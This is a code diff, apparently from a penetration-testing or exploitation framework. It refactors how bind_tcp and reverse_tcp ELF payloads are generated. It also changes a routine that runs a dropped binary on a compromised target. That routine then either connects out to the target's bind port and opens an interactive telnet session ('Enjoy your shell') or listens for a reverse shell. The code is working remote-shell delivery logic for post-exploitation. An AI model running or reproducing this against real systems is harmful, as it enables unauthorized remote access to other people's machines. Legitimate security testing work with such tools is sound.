@@ -33,7 +33,9 @@ def bind_tcp(arch, rport):
         print_error("Platform not supported")
         return None
 
-    payload.generate(rport)
+    payload.port = rport
+
+    payload.generate()
     return payload.generate_elf()
 
 
@@ -50,7 +52,10 @@ def reverse_tcp(arch, lhost, lport):
         print_error("Platform not supported")
         return None
 
-    payload.generate(lhost, lport)
+    payload.target = lhost
+    payload.port = lport
+
+    payload.generate()
     return payload.generate_elf()
 
 
@@ -199,11 +204,26 @@ class Communication(object):
             self.exploit.execute(cmd)
 
         # execute binary
-        sock = self.listen(self.options['lhost'], self.options['lport'])
-        self.execute_binary(location, self.binary_name)
+        if self.options['technique'] == "bind_tcp":
+            self.execute_binary(location, self.binary_name)
 
-        # waiting for shell
-        self.shell(sock)
+            print_status("Connecting to {}:{}".format(self.options['rhost'], self.options['rport']))
+            time.sleep(2)
+
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+            sock.connect((self.options['rhost'], self.options['rport']))
+
+            print_success("Enjoy your shell")
+            tn = telnetlib.Telnet()
+            tn.sock = sock
+            tn.interact()
+
+        elif self.options['technique'] == "reverse_tcp":
+            sock = self.listen(self.options['lhost'], self.options['lport'])
+            self.execute_binary(location, self.binary_name)
+
+            # waiting for shell
+            self.shell(sock)
 
     def awk(self, binary):
         print_status("Using awk method")
